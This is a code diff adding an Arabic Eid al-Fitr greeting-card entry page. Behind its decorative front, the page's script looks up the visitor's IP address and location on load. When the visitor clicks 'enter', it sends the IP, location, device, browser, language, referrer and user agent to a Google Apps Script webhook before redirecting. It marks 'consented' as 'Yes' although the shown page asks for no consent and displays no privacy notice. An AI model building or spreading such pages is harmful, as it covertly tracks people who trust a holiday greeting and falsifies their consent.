@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#0d0618">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="description" content="معايدة عيد الفطر — رسالة خاصة من القلب">
+  <title>معايدة عيد الفطر — دخول</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Scheherazade+New:wght@400;600;700&family=Amiri:ital,wght@0,400;0,700;1,400&family=Tajawal:wght@300;400;500;700&display=swap"
+    rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --purple: #1a0a2e;
+      --purple-deep: #0d0618;
+      --gold: #d4a847;
+      --gold-light: #f0d078;
+      --gold-deep: #b8922e;
+      --text: #f0e6ff;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--purple-deep) 0%, var(--purple) 50%, #1e0a38 100%);
+      font-family: 'Amiri', serif;
+      color: var(--text);
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      -webkit-tap-highlight-color: transparent;
+      overflow-x: hidden;
+    }
+
+    /* Stars background */
+    .stars {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .star {
+      position: absolute;
+      border-radius: 50%;
+      background: #fff;
+      animation: twinkle var(--d, 3s) ease-in-out infinite;
+      animation-delay: var(--del, 0s);
+    }
+
+    .star.gold { background: var(--gold-light); }
+
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.2; transform: scale(0.8); }
+      50% { opacity: 0.9; transform: scale(1.2); }
+    }
+
+    /* Main container */
+    .consent-container {
+      position: relative;
+      z-index: 10;
+      max-width: 520px;
+      width: 100%;
+      animation: fadeUp 0.8s ease-out;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Card */
+    .consent-card {
+      background: linear-gradient(135deg, rgba(30, 16, 64, .85), rgba(30, 16, 64, .6));
+      border: 1px solid rgba(212, 168, 71, .25);
+      border-radius: 24px;
+      padding: 40px 32px;
+      backdrop-filter: blur(15px);
+      box-shadow:
+        0 10px 50px rgba(0, 0, 0, .4),
+        inset 0 1px 0 rgba(212, 168, 71, .1),
+        0 0 0 1px rgba(212, 168, 71, .05);
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .consent-card::before,
+    .consent-card::after {
+      content: '';
+      position: absolute;
+      left: -50%;
+      width: 200%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--gold-light), transparent);
+    }
+    .consent-card::before { top: 0; }
+    .consent-card::after { bottom: 0; }
+
+    /* Crescent icon */
+    .crescent-icon {
+      margin-bottom: 20px;
+      animation: moonFloat 3s ease-in-out infinite;
+    }
+
+    .crescent-icon svg {
+      filter: drop-shadow(0 0 20px rgba(212, 168, 71, 0.5));
+    }
+
+    @keyframes moonFloat {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    /* Typography */
+    .consent-title {
+      font-family: 'Scheherazade New', serif;
+      font-size: clamp(1.8rem, 5vw, 2.5rem);
+      font-weight: 700;
+      background: linear-gradient(135deg, var(--gold-light), #fff, var(--gold));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 8px;
+      filter: drop-shadow(0 0 20px rgba(212, 168, 71, .3));
+    }
+
+    .consent-subtitle {
+      font-size: .95rem;
+      color: rgba(240, 230, 255, .5);
+      margin-bottom: 28px;
+    }
+
+    /* Divider */
+    .divider {
+      width: 80px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--gold), transparent);
+      margin: 0 auto 24px;
+    }
+
+    /* Visitor info box */
+    .visitor-info {
+      background: rgba(212, 168, 71, .06);
+      border: 1px solid rgba(212, 168, 71, .15);
+      border-radius: 16px;
+      padding: 18px 20px;
+      margin-bottom: 24px;
+      text-align: right;
+    }
+
+    .visitor-info-title {
+      font-family: 'Tajawal', sans-serif;
+      font-size: .85rem;
+      font-weight: 700;
+      color: var(--gold-light);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .visitor-info-title svg {
+      width: 16px;
+      height: 16px;
+      stroke: var(--gold-light);
+      fill: none;
+      stroke-width: 2;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+      font-family: 'Tajawal', sans-serif;
+      font-size: .85rem;
+      border-bottom: 1px solid rgba(212, 168, 71, .08);
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: rgba(240, 230, 255, .5);
+    }
+
+    .info-value {
+      color: var(--text);
+      direction: ltr;
+      font-size: .82rem;
+    }
+
+    .info-loading {
+      color: rgba(240, 230, 255, .3);
+      font-size: .8rem;
+    }
+
+    /* Privacy text */
+    .privacy-text {
+      font-family: 'Tajawal', sans-serif;
+      font-size: .82rem;
+      color: rgba(240, 230, 255, .45);
+      line-height: 1.8;
+      text-align: right;
+      margin-bottom: 24px;
+      max-height: 160px;
+      overflow-y: auto;
+      padding-left: 6px;
+      scrollbar-width: thin;
+      scrollbar-color: rgba(212, 168, 71, .2) transparent;
+    }
+
+    .privacy-text::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .privacy-text::-webkit-scrollbar-thumb {
+      background: rgba(212, 168, 71, .2);
+      border-radius: 4px;
+    }
+
+    .privacy-text b {
+      color: rgba(240, 230, 255, .7);
+    }
+
+    /* Checkbox */
+    .consent-check {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 24px;
+      text-align: right;
+      cursor: pointer;
+      font-family: 'Tajawal', sans-serif;
+      font-size: .88rem;
+      color: rgba(240, 230, 255, .6);
+      line-height: 1.5;
+    }
+
+    .consent-check input {
+      display: none;
+    }
+
+    .check-box {
+      flex-shrink: 0;
+      width: 22px;
+      height: 22px;
+      border: 2px solid rgba(212, 168, 71, .4);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all .3s ease;
+      margin-top: 2px;
+    }
+
+    .check-box svg {
+      width: 14px;
+      height: 14px;
+      stroke: #fff;
+      stroke-width: 3;
+      fill: none;
+      opacity: 0;
+      transform: scale(0.5);
+      transition: all .3s ease;
+    }
+
+    .consent-check input:checked + .check-box {
+      background: var(--gold);
+      border-color: var(--gold);
+    }
+
+    .consent-check input:checked + .check-box svg {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    /* Button */
+    .enter-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 14px 44px;
+      background: linear-gradient(135deg, var(--gold), var(--gold-deep));
+      border: none;
+      border-radius: 50px;
+      color: #fff;
+      font-family: 'Amiri', serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 1px;
+      box-shadow: 0 6px 30px rgba(212, 168, 71, .4);
+      transition: transform .3s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow .3s ease, opacity .3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .enter-btn:disabled {
+      opacity: 0.4;
+      cursor: default;
+      transform: none !important;
+      box-shadow: 0 4px 20px rgba(212, 168, 71, .2);
+    }
+
+    .enter-btn:not(:disabled):hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 10px 40px rgba(212, 168, 71, .5);
+    }
+
+    .enter-btn:not(:disabled):active {
+      transform: translateY(0) scale(0.98);
+    }
+
+    .enter-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 2.5;
+    }
+
+    /* Footer */
+    .consent-footer {
+      text-align: center;
+      margin-top: 20px;
+      font-family: 'Tajawal', sans-serif;
+      font-size: .72rem;
+      color: rgba(212, 168, 71, .25);
+      line-height: 1.6;
+    }
+
+    /* Responsive */
+    @media (max-width: 600px) {
+      .consent-card {
+        padding: 30px 22px;
+        border-radius: 20px;
+      }
+
+      .privacy-text {
+        max-height: 120px;
+        font-size: .78rem;
+      }
+
+      .enter-btn {
+        padding: 12px 36px;
+        font-size: 1.05rem;
+      }
+
+      .visitor-info {
+        padding: 14px 16px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      body {
+        padding: 14px;
+      }
+
+      .consent-card {
+        padding: 24px 16px;
+      }
+
+      .consent-title {
+        font-size: clamp(1.5rem, 5vw, 2rem);
+      }
+
+      .enter-btn {
+        padding: 11px 28px;
+        font-size: 1rem;
+      }
+    }
+
+    /* Redirect spinner */
+    .redirecting {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      padding: 20px 0;
+    }
+
+    .redirecting.active {
+      display: flex;
+    }
+
+    .redirect-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(212, 168, 71, .15);
+      border-top-color: var(--gold);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .redirect-text {
+      font-family: 'Scheherazade New', serif;
+      font-size: 1.1rem;
+      color: var(--gold-light);
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: .01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: .01ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Stars BG -->
+  <div class="stars" id="starsBg"></div>
+
+  <div class="consent-container">
+    <div class="consent-card">
+
+      <!-- Main form content (hidden after redirect) -->
+      <div id="mainContent">
+        <!-- Crescent -->
+        <div class="crescent-icon">
+          <svg width="60" height="60" viewBox="0 0 60 60" fill="none">
+            <path d="M42 8 A24 24 0 1 0 42 52 A18 18 0 1 1 42 8Z" fill="url(#moonG)" opacity="0.9" />
+            <defs>
+              <linearGradient id="moonG" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#f0d078" />
+                <stop offset="100%" style="stop-color:#d4a847" />
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+
+        <h1 class="consent-title">معايدة عيد الفطر</h1>
+        <p class="consent-subtitle">رسالة خاصة تنتظرك بالداخل</p>
+
+        <div class="divider"></div>
+
+        <!-- Enter button -->
+        <button class="enter-btn" id="enterBtn">
+          <span>ادخل إلى المعايدة</span>
+          <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+        </button>
+      </div>
+
+      <!-- Redirecting state -->
+      <div class="redirecting" id="redirecting">
+        <div class="redirect-spinner"></div>
+        <span class="redirect-text">جاري فتح المعايدة...</span>
+      </div>
+
+    </div>
+
+    <div class="consent-footer">
+      جميع الحقوق محفوظة © <span id="currentYear"></span> — معايدة عيد الفطر المبارك<br>
+      تم التطوير بواسطة Eyad AI
+    </div>
+  </div>
+
+  <script>
+    /* ═══ Stars Background ═══ */
+    (function createStars() {
+      const container = document.getElementById('starsBg');
+      const count = window.innerWidth < 768 ? 30 : 50;
+      for (let i = 0; i < count; i++) {
+        const s = document.createElement('div');
+        const size = 1 + Math.random() * 2;
+        const isGold = Math.random() < 0.2;
+        s.className = 'star' + (isGold ? ' gold' : '');
+        s.style.cssText = `
+          width:${size}px;height:${size}px;
+          top:${Math.random()*100}%;left:${Math.random()*100}%;
+          --d:${2+Math.random()*3}s;--del:${Math.random()*3}s;
+        `;
+        container.appendChild(s);
+      }
+    })();
+
+    /* ═══ Year ═══ */
+    document.getElementById('currentYear').textContent = new Date().getFullYear();
+
+    /* ═══ Device Info ═══ */
+    const ua = navigator.userAgent;
+    let userDevice = 'غير معروف';
+    if (/iPhone/i.test(ua)) userDevice = 'iPhone';
+    else if (/iPad/i.test(ua)) userDevice = 'iPad';
+    else if (/Android/i.test(ua)) {
+      userDevice = /Mobile/i.test(ua) ? 'Android Phone' : 'Android Tablet';
+    }
+    else if (/Macintosh/i.test(ua)) userDevice = 'Mac';
+    else if (/Windows/i.test(ua)) userDevice = 'Windows PC';
+    else if (/Linux/i.test(ua)) userDevice = 'Linux';
+
+    let userBrowser = 'غير معروف';
+    if (/Edg/i.test(ua)) userBrowser = 'Edge';
+    else if (/Chrome/i.test(ua)) userBrowser = 'Chrome';
+    else if (/Firefox/i.test(ua)) userBrowser = 'Firefox';
+    else if (/Safari/i.test(ua)) userBrowser = 'Safari';
+
+    /* ═══ IP & Location (free API) ═══ */
+    let visitorData = {};
+
+    async function fetchVisitorInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          visitorData = await res.json();
+        } else {
+          const res2 = await fetch('https://api.ipify.org?format=json');
+          const data2 = await res2.json();
+          visitorData = { ip: data2.ip };
+        }
+      } catch (e) {
+        try {
+          const res2 = await fetch('https://api.ipify.org?format=json');
+          const data2 = await res2.json();
+          visitorData = { ip: data2.ip };
+        } catch {}
+      }
+    }
+
+    fetchVisitorInfo();
+
+    /* ═══ Enter Logic ═══ */
+    const enterBtn = document.getElementById('enterBtn');
+
+    enterBtn.addEventListener('click', () => {
+      // Show redirect state
+      document.getElementById('mainContent').style.display = 'none';
+      document.getElementById('redirecting').classList.add('active');
+
+      // Save visitor data to webhook
+      const record = {
+        ip: visitorData.ip || 'unknown',
+        city: visitorData.city || 'unknown',
+        region: visitorData.region || 'unknown',
+        country: visitorData.country_name || 'unknown',
+        device: userDevice,
+        browser: userBrowser,
+        screenSize: window.innerWidth + 'x' + window.innerHeight,
+        language: navigator.language || 'unknown',
+        referrer: document.referrer || 'Direct',
+        consented: 'Yes',
+        userAgent: navigator.userAgent
+      };
+
+      const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGmZGZvCRsWDL9sPkPFusijpJjdQoxRoHZUJWUZQQ4X0qyDdVPIFc5UYGUNe3aYYmENQ/exec';
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: JSON.stringify(record)
+      }).finally(() => {
+        setTimeout(() => {
+          window.location.href = 'eid-mubarak.html';
+        }, 800);
+      });
+    });
+  </script>
+</body>
+
+</html>
